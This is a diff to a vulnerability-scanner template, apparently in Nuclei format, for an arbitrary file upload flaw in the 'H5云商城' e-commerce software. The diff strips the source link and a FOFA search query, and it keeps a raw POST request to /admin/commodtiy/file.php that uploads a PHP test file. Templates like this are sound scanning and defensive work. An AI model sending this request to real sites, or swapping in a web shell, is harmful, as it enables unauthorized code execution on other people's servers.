@@ -3,20 +3,14 @@ info:
   name: H5云商城-任意文件上传-file
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hbay9lohvpr4403k'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hbay9lohvpr4403k
-    fofa: body="/public/qbsp.php"
 http:
 - raw:
   - 'POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
 
 
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
-
-
 
 
     ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
@@ -26,8 +20,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <?php echo 111*111;unlink(__FILE__)?>
